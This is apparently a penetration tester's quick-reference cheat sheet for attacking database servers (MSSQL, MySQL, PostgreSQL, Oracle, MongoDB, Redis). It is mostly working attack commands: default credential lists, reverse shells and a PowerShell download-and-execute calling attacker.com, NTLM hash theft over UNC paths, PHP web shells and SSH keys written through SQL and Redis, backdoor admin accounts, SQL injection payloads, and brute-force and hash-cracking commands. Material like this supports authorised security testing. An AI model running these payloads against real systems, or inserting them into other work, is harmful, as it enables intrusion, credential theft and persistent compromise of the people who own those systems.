# Database Quick Reference Guide

Fast lookup for common attack patterns, queries, and exploitation techniques. Keep this handy during active testing.

Related: [[DB-02-Technical-Testing-Checklist]] | [[DB-03-Query-Tracker]]

---

## Default Credentials

### Microsoft SQL Server
```
sa:<blank>
sa:sa
sa:password
sa:Password123
sa:P@ssw0rd
BUILTIN\Administrators
```

### MySQL
```
root:<blank>
root:root
root:password
root:toor
mysql:<blank>
```

### PostgreSQL
```
postgres:<blank>
postgres:postgres
postgres:password
admin:admin
```

### Oracle
```
SYS:change_on_install
SYSTEM:manager
SCOTT:tiger
HR:HR
DBSNMP:dbsnmp
```

### MongoDB
```
admin:<blank>
root:<blank>
<no authentication>
```

### Redis
```
<no authentication>
(AUTH password if set)
```

---

## Quick Enumeration

### Port Scanning
```bash
# Nmap - DB ports
nmap -p 1433,3306,5432,1521,27017,6379 target.com

# Nmap - service detection
nmap -sV -p 1433 target.com

# Nmap - MSSQL scripts
nmap -p 1433 --script ms-sql-info target.com
nmap -p 1433 --script ms-sql-empty-password target.com
```

### Banner Grabbing
```bash
# Netcat
nc -nv target.com 1433
nc -nv target.com 3306

# Telnet
telnet target.com 1433

# Nmap
nmap -sV -p 1433 target.com --script-args mssql.instance-port=1433
```

---

## MSSQL Quick Wins

### OS Command Execution (xp_cmdshell)
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user hacker Password123! /add';

-- Reverse shell
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")';
```

### Read Files (OPENROWSET)
```sql
-- Enable Ad Hoc Distributed Queries
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
RECONFIGURE;

-- Read file
SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;

-- Read through UNC (steal Net-NTLM hash)
EXEC xp_dirtree '\\attacker.com\share';
```

### Privilege Escalation
```sql
-- Check current privs
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Impersonate sa
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Find impersonatable logins
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Linked server privilege escalation
EXECUTE('EXEC sp_addsrvrolemember ''DOMAIN\user'', ''sysadmin'';') AT [LinkedServer];
```

### Linked Server Exploitation
```sql
-- Enumerate linked servers
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Query linked server
SELECT * FROM OPENQUERY([LinkedServer], 'SELECT @@version');

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT [LinkedServer];

-- Chain through multiple links
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LinkedServer2]') AT [LinkedServer1];
```

### Hash Extraction
```sql
-- Extract password hashes
SELECT name, password_hash FROM sys.sql_logins;

-- Crack with hashcat
hashcat -m 1731 mssql_hashes.txt rockyou.txt
```

---

## MySQL Quick Wins

### Read Files
```sql
-- Check FILE privilege
SELECT file_priv FROM mysql.user WHERE user='current_user';

-- Read file
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- Read via LOAD DATA INFILE
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE temp_table;
```

### Write Files (Web Shell)
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Write web shell
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Write SSH key
SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';
```

### UDF Command Execution
```sql
-- Load shared library (Linux)
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT sys_exec('id');
SELECT sys_exec('nc attacker.com 4444 -e /bin/bash');
```

### Privilege Escalation
```sql
-- Check current user privs
SELECT user, host, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Super_priv, File_priv FROM mysql.user WHERE user='current_user';

-- Escalate via GRANT
GRANT ALL PRIVILEGES ON *.* TO 'lowpriv'@'%' IDENTIFIED BY 'password';
FLUSH PRIVILEGES;

-- Add to admin
INSERT INTO mysql.user (User, Host, password) VALUES ('hacker', '%', PASSWORD('Password123!'));
UPDATE mysql.user SET Super_priv='Y' WHERE User='hacker';
FLUSH PRIVILEGES;
```

---

## PostgreSQL Quick Wins

### Command Execution (COPY)
```sql
-- PostgreSQL 9.3+
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

-- Reverse shell
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"';
```

### Read Files
```sql
-- pg_read_file (must be superuser)
SELECT pg_read_file('/etc/passwd', 0, 200);

-- Via COPY
CREATE TABLE file_read(data text);
COPY file_read FROM '/etc/passwd';
SELECT * FROM file_read;

-- Large objects
SELECT lo_import('/etc/passwd', 12345);
SELECT * FROM pg_largeobject WHERE loid=12345;
```

### Write Files
```sql
-- COPY TO
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php';

-- pg_write_file (custom function)
CREATE OR REPLACE FUNCTION pg_write_file(text, text) RETURNS void AS $$
BEGIN
  EXECUTE 'COPY (SELECT ' || quote_literal($1) || ') TO ' || quote_literal($2);
END;
$$ LANGUAGE plpgsql;

SELECT pg_write_file('shell code', '/tmp/shell.php');
```

### Privilege Escalation
```sql
-- Check if superuser
SELECT current_setting('is_superuser');

-- List superusers
SELECT usename FROM pg_user WHERE usesuper=true;

-- Escalate (requires superuser to execute)
ALTER USER lowpriv WITH SUPERUSER;

-- Create superuser
CREATE USER hacker WITH SUPERUSER PASSWORD 'Password123!';
```

---

## Oracle Quick Wins

### Command Execution (Java)
```sql
-- Check Java permissions
SELECT * FROM dba_java_policy;

-- Execute OS command via Java
BEGIN
  DBMS_JAVA.grant_permission('PUBLIC', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');
  DBMS_JAVA.grant_permission('PUBLIC', 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
  DBMS_JAVA.grant_permission('PUBLIC', 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
END;
/

-- Create Java stored procedure
CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "Exec" AS
import java.io.*;
public class Exec {
  public static void execCommand(String command) throws IOException {
    Runtime.getRuntime().exec(command);
  }
};
/

-- Execute
EXEC DBMS_JAVA.set_output(20000);
CALL dbms_java.runjava('Exec.execCommand("/bin/bash -c id")');
```

### Read Files (UTL_FILE)
```sql
-- Check UTL_FILE directories
SELECT * FROM all_directories;

-- Read file
DECLARE
  v_file UTL_FILE.FILE_TYPE;
  v_line VARCHAR2(1000);
BEGIN
  v_file := UTL_FILE.FOPEN('DIRECTORY_NAME', 'file.txt', 'R');
  LOOP
    UTL_FILE.GET_LINE(v_file, v_line);
    DBMS_OUTPUT.PUT_LINE(v_line);
  END LOOP;
EXCEPTION WHEN NO_DATA_FOUND THEN
  UTL_FILE.FCLOSE(v_file);
END;
/
```

### Privilege Escalation
```sql
-- Check current privs
SELECT * FROM session_privs;

-- Check if DBA
SELECT * FROM session_roles WHERE role='DBA';

-- Grant DBA
GRANT DBA TO lowpriv;

-- Create privileged user
CREATE USER hacker IDENTIFIED BY Password123;
GRANT DBA TO hacker;
```

---

## MongoDB Quick Wins

### Authentication Bypass (No Auth)
```bash
# Connect without credentials
mongo target.com:27017

# Or with mongo shell
mongosh mongodb://target.com:27017
```

### NoSQL Injection
```javascript
// Authentication bypass
db.users.find({username: {$ne: null}, password: {$ne: null}})

// Extract data
db.users.find({username: {$regex: "^a"}})  // Users starting with 'a'

// Boolean enumeration
db.users.find({username: "admin", password: {$regex: "^a"}})  // Check if admin password starts with 'a'
```

### Command Execution (JavaScript)
```javascript
// Server-side JavaScript execution
db.eval('return "test"')
db.eval('return db.serverStatus()')

// Load external script
db.loadServerScripts()

// Execute shell command (if enabled)
db.runCommand({eval: 'run("ls")'})
```

### Privilege Escalation
```javascript
// Check current user
db.runCommand({connectionStatus: 1})

// Create admin user
use admin
db.createUser({user: "hacker", pwd: "Password123!", roles: ["root"]})

// Grant role
db.grantRolesToUser("lowpriv", ["root"])
```

---

## Redis Quick Wins

### Authentication
```bash
# Connect without auth (common misconfiguration)
redis-cli -h target.com

# With password
redis-cli -h target.com -a password
```

### Write Web Shell
```bash
# Set shell content
redis-cli -h target.com
config set dir /var/www/html
config set dbfilename shell.php
set test "<?php system($_GET['c']); ?>"
save
```

### Write SSH Key
```bash
# Generate SSH key
ssh-keygen -t rsa -f redis_key

# Write authorized_keys
redis-cli -h target.com
config set dir /root/.ssh
config set dbfilename authorized_keys
set test "\n\nssh-rsa AAAA...\n\n"
save
```

### Command Execution (Lua)
```lua
-- Execute via EVAL
EVAL "return redis.call('info')" 0

-- Load malicious module
MODULE LOAD /path/to/malicious.so
```

---

## Brute Force Commands

### Hydra
```bash
# MSSQL
hydra -l sa -P passwords.txt mssql://target.com

# MySQL
hydra -l root -P passwords.txt mysql://target.com

# PostgreSQL
hydra -l postgres -P passwords.txt postgres://target.com

# MongoDB
hydra -l admin -P passwords.txt mongodb://target.com
```

### Medusa
```bash
# MSSQL
medusa -h target.com -u sa -P passwords.txt -M mssql

# MySQL
medusa -h target.com -u root -P passwords.txt -M mysql

# PostgreSQL
medusa -h target.com -u postgres -P passwords.txt -M postgres
```

### Ncrack
```bash
ncrack -p 1433 --user sa -P passwords.txt target.com
ncrack -p 3306 --user root -P passwords.txt target.com
```

---

## PowerUpSQL (MSSQL)

```powershell
# Import module
Import-Module PowerUpSQL

# Discover SQL Servers
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP

# Enumerate info
Get-SQLServerInfo -Instance server\instance

# Check access
Get-SQLConnectionTest -Instance server\instance

# Audit for weak configs
Invoke-SQLAudit -Instance server\instance

# Privilege escalation
Invoke-SQLEscalatePriv -Instance server\instance

# Execute command
Invoke-SQLOSCmd -Instance server\instance -Command "whoami"

# Linked server crawl
Get-SQLServerLinkCrawl -Instance server\instance
```

---

## Impacket (MSSQL)

```bash
# mssqlclient.py - Connect
mssqlclient.py DOMAIN/user:password@target.com

# Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Execute command
SQL> xp_cmdshell whoami

# With Windows auth
mssqlclient.py -windows-auth DOMAIN/user:password@target.com

# With hash (pass-the-hash)
mssqlclient.py -hashes :NTHASH DOMAIN/user@target.com
```

---

## SQL Injection Exploitation

### Union-Based
```sql
-- Determine columns
' ORDER BY 1-- 
' ORDER BY 10-- 
(Increase until error)

-- Find injectable column
' UNION SELECT NULL,NULL,NULL-- 
' UNION SELECT 'a',NULL,NULL-- 

-- Extract data
' UNION SELECT NULL,@@version,NULL-- 
' UNION SELECT NULL,user,password FROM mysql.user-- 
```

### Error-Based
```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- 

-- MSSQL
' AND 1=CONVERT(int,@@version)-- 

-- Oracle
' AND 1=UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1))-- 
```

### Blind Boolean
```sql
-- MySQL
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- 

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 password FROM users),1,1)='a'-- 
```

### Time-Based
```sql
-- MySQL
' AND SLEEP(5)-- 

-- MSSQL
'; WAITFOR DELAY '00:00:05'-- 

-- PostgreSQL
'; SELECT pg_sleep(5)-- 

-- Oracle
'; BEGIN DBMS_LOCK.SLEEP(5); END;-- 
```

---

## Useful SQL Queries

### MSSQL
```sql
-- Version
SELECT @@VERSION;

-- Current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Current database
SELECT DB_NAME();

-- List databases
SELECT name FROM sys.databases;

-- List tables
SELECT name FROM sys.tables;

-- List columns
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('table_name');

-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List logins
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U');

-- List users in current DB
SELECT name FROM sys.database_principals WHERE type IN ('S','U');
```

### MySQL
```sql
-- Version
SELECT @@version;

-- Current user
SELECT user();
SELECT current_user();

-- Current database
SELECT database();

-- List databases
SELECT schema_name FROM information_schema.schemata;

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';

-- Check privileges
SELECT * FROM mysql.user WHERE user='current_user';

-- Read file
SELECT LOAD_FILE('/etc/passwd');
```

### PostgreSQL
```sql
-- Version
SELECT version();

-- Current user
SELECT current_user;

-- Current database
SELECT current_database();

-- List databases
SELECT datname FROM pg_database;

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public';

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='table_name';

-- Check if superuser
SELECT current_setting('is_superuser');
```

---

## Hash Cracking

### Hashcat
```bash
# MSSQL (2000/2005)
hashcat -m 131 mssql_hashes.txt rockyou.txt

# MSSQL (2012+)
hashcat -m 1731 mssql_hashes.txt rockyou.txt

# MySQL (old)
hashcat -m 200 mysql_hashes.txt rockyou.txt

# MySQL (new)
hashcat -m 300 mysql_hashes.txt rockyou.txt

# PostgreSQL (md5)
hashcat -m 12 postgres_hashes.txt rockyou.txt

# Oracle (10g/11g)
hashcat -m 3100 oracle_hashes.txt rockyou.txt
```

### John the Ripper
```bash
# Generic
john --wordlist=rockyou.txt hashes.txt

# MSSQL
john --format=mssql hashes.txt

# MySQL
john --format=mysql-sha1 hashes.txt
```

---

## Metasploit Modules

### Auxiliary Modules
```bash
# MSSQL
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_exec

# MySQL
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql

# PostgreSQL
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_login
```

### Exploit Modules
```bash
# MSSQL
use exploit/windows/mssql/mssql_payload

# MySQL
use exploit/windows/mysql/mysql_mof
use exploit/multi/mysql/mysql_udf_payload
```

---

## Tags
#quick-reference #database #sql #nosql #exploitation #cheat-sheet

---

## Related Documents
- [[DB-00-Overview|Overview]]
- [[DB-01-Admin-Checklist|Admin Checklist]]
- [[DB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[DB-03-Query-Tracker|Query Tracker]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
